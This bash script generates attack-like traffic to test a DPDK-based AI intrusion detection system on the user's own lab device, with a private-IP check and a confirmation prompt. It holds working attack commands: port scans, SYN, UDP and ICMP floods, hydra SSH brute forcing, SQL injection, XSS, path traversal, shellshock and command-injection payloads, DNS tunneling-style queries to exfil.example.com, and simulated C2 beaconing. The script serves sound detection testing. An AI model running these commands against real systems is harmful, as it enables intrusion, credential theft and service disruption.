#!/usr/bin/env bash
# gen_traffic.sh - lab traffic generator for DPDK + AI IDS/IPS POC
# Run from the Ubuntu VM (bridged adapter) against YOUR OWN Jetson only.
#
# Usage: sudo ./gen_traffic.sh <target_ip> [phase ...]
#   phases: baseline scan synflood udpflood icmp ssh http dns beacon all
#   e.g.   sudo ./gen_traffic.sh 192.168.50.20 all
#          sudo ./gen_traffic.sh 192.168.50.20 scan ssh
#
# Install deps:  sudo apt install -y nmap hping3 hydra iperf3 curl dnsutils
# On the Jetson: iperf3 -s -D ; sudo apt install nginx openssh-server

set -u
TARGET="${1:-}"; shift || true
PHASES=("${@:-all}")
PAUSE=5   # seconds between phases so flows are easy to separate

# ---- safety: private IPs only + confirmation ----
if [[ -z "$TARGET" ]]; then echo "Usage: sudo $0 <target_ip> [phases]"; exit 1; fi
if ! [[ "$TARGET" =~ ^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1])\.) ]]; then
  echo "Refusing: $TARGET is not a private IP. Lab use only."; exit 1
fi
[[ $EUID -ne 0 ]] && { echo "Run with sudo (hping3/nmap -sS need root)."; exit 1; }
read -rp "Generate attack-like traffic against $TARGET (your own lab device)? [y/N] " ok
[[ "$ok" =~ ^[Yy]$ ]] || exit 0

for t in nmap hping3 hydra iperf3 curl dig; do
  command -v "$t" >/dev/null || { echo "Missing: $t"; exit 1; }
done

log() { echo -e "\n[$(date +%H:%M:%S)] === $* ==="; }
has() { local p; for p in "${PHASES[@]}"; do [[ "$p" == "all" || "$p" == "$1" ]] && return 0; done; return 1; }

# ---- 1. Normal baseline ----
if has baseline; then
  log "BASELINE: iperf3 TCP 20s + ping + normal HTTP"
  iperf3 -c "$TARGET" -t 20 || echo "(iperf3 server not running on target?)"
  ping -c 10 "$TARGET"
  for i in $(seq 1 20); do curl -s -o /dev/null "http://$TARGET/"; sleep 0.5; done
  sleep $PAUSE
fi

# ---- 2. Port scans ----
if has scan; then
  log "PORT SCAN: SYN scan 1-1000, then version scan, then FIN/Xmas"
  nmap -sS -p 1-1000 -T4 "$TARGET"
  nmap -sV -p 22,80,443,8080 "$TARGET"
  nmap -sF -p 1-200 "$TARGET"
  nmap -sX -p 1-200 "$TARGET"
  sleep $PAUSE
fi

# ---- 3. SYN flood (rate-limited ~1000 pps, 10s) ----
if has synflood; then
  log "SYN FLOOD: ~1000 pps, random source ports, 10s"
  timeout 10 hping3 -S -p 80 -i u1000 "$TARGET" >/dev/null 2>&1
  sleep $PAUSE
fi

# ---- 4. UDP flood via iperf3 ----
if has udpflood; then
  log "UDP FLOOD: iperf3 UDP 200 Mbps, 10s"
  iperf3 -c "$TARGET" -u -b 200M -t 10 || true
  sleep $PAUSE
fi

# ---- 5. ICMP flood (~1000 pps, 200 packets burst) ----
if has icmp; then
  log "ICMP FLOOD: 2000 pings, 1ms interval"
  ping -c 2000 -i 0.001 -s 512 "$TARGET" >/dev/null
  sleep $PAUSE
fi

# ---- 6. SSH brute force (small wordlists) ----
if has ssh; then
  log "SSH BRUTE FORCE: hydra, small lists"
  printf "root\nadmin\nubuntu\nuser\ntest\n" > /tmp/users.txt
  printf "123456\npassword\nadmin\nroot\nletmein\nqwerty\nwelcome1\n" > /tmp/pass.txt
  timeout 60 hydra -L /tmp/users.txt -P /tmp/pass.txt -t 4 "ssh://$TARGET" || true
  sleep $PAUSE
fi

# ---- 7. HTTP attack patterns (SQLi, XSS, traversal, scanner UAs) ----
if has http; then
  log "HTTP ATTACK PATTERNS"
  # directory probing
  for p in admin login phpmyadmin .env .git/config wp-login.php backup.zip server-status cgi-bin/test.cgi; do
    curl -s -o /dev/null -A "Nikto/2.1.6" "http://$TARGET/$p"; sleep 0.2
  done
  # SQL injection
  for q in "1' OR '1'='1" "1 UNION SELECT username,password FROM users--" "1; DROP TABLE users--"; do
    curl -s -o /dev/null -A "sqlmap/1.7" -G --data-urlencode "id=$q" "http://$TARGET/item.php"; sleep 0.2
  done
  # XSS
  curl -s -o /dev/null -G --data-urlencode "q=<script>alert(1)</script>" "http://$TARGET/search"
  # path traversal
  curl -s -o /dev/null --path-as-is "http://$TARGET/../../../../etc/passwd"
  curl -s -o /dev/null --path-as-is "http://$TARGET/%2e%2e/%2e%2e/etc/passwd"
  # command injection / shellshock style
  curl -s -o /dev/null -A "() { :; }; /bin/cat /etc/passwd" "http://$TARGET/cgi-bin/test.cgi"
  curl -s -o /dev/null -G --data-urlencode "cmd=;cat /etc/passwd" "http://$TARGET/exec"
  # HTTP request burst
  for i in $(seq 1 300); do curl -s -o /dev/null "http://$TARGET/" & done; wait
  sleep $PAUSE
fi

# ---- 8. DNS tunneling-like queries (needs DNS service on target, else just packets) ----
if has dns; then
  log "DNS: long random subdomains (tunneling-like)"
  for i in $(seq 1 100); do
    sub=$(head -c 30 /dev/urandom | base64 | tr -dc 'a-z0-9' | head -c 40)
    dig +time=1 +tries=1 "@$TARGET" "$sub.exfil.example.com" TXT >/dev/null 2>&1
  done
  sleep $PAUSE
fi

# ---- 9. C2 beaconing: fixed-interval small HTTP requests ----
if has beacon; then
  log "BEACONING: 20 requests, fixed 5s interval"
  for i in $(seq 1 20); do
    curl -s -o /dev/null -A "Mozilla/4.0 (compatible; MSIE 6.0)" -d "id=host42&status=alive" "http://$TARGET/beacon"
    sleep 5
  done
fi

log "DONE. Note timestamps above to correlate with your DPDK flow logs."
